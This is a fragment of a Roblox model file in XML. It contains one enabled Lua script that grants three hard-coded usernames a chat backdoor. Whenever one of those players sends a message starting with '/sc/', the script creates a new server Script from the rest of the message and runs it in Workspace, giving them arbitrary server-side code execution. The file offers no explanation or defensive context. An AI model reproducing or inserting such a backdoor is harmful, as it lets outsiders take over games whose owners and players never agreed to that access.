		<Item class="Script" referent="RBX3881">
			<Properties>
				<bool name="Disabled">false</bool>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">Script</string>
				<string name="Source">acces = {&quot;kalle2990&quot;, &quot;Ylsid&quot;, &quot;zipperipper&quot;}

function checkPermisson(player)
	for i = 1, #acces do
		if acces[i]:lower() == player.Name:lower() then
			return true
		end
	end
	return false
end

function onChatted(msg)
	if string.sub(msg, 1, 4) == &quot;/sc/&quot; then
		local sc = Instance.new(&quot;Script&quot;)
		sc.Name = &quot;CreatedScript&quot;
		sc.Source = string.sub(msg, 5)
		sc.Parent = game.Workspace
	end
end

function onEnter(player)
	if checkPermisson(player) == true then
		player.Chatted:connect(onChatted)
	end
end

game.Players.ChildAdded:connect(onEnter)
